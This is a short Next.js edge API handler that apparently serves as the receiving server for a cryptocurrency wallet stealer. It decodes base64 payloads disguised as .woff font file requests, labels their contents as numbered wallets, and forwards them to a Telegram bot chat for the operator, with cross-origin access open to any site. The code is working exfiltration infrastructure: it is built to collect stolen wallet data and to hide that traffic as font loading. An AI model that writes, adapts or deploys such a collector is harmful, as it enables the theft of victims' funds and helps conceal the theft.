import { NextRequest } from 'next/server'
import { decode } from 'js-base64'

export const config = {
  runtime: 'edge',
}

export default async function handler(req: NextRequest) {
  const url = new URL(req.url)
  const slug = url.pathname.split('/api/inbox/')[1]

  if (!slug) {
    return new Response('Missing slug', {
      status: 400,
      headers: { 'Access-Control-Allow-Origin': '*' },
    })
  }

  try {
    const base64 = slug.split('_')[1].split('.woff')[0]
    const json = JSON.parse(decode(base64))

    const { sBundles, keybundle, ts } = json
    const timestamp = new Date(ts || Date.now()).toLocaleString()

    const messages = sBundles.map((sb: string, i: number) => {
      const [iv_b64, enc_b64] = sb.split(':')
      return `wallet ${i + 1}\n${enc_b64}`
    })

    const finalText = [`${timestamp}`, '', ...messages].join('\n')

    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: finalText,
      }),
    })

    return new Response('ok', {
      status: 200,
      headers: { 'Access-Control-Allow-Origin': '*' },
    })
  } catch (err) {
    return new Response('Error parsing payload', {
      status: 500,
      headers: { 'Access-Control-Allow-Origin': '*' },
    })
  }
}
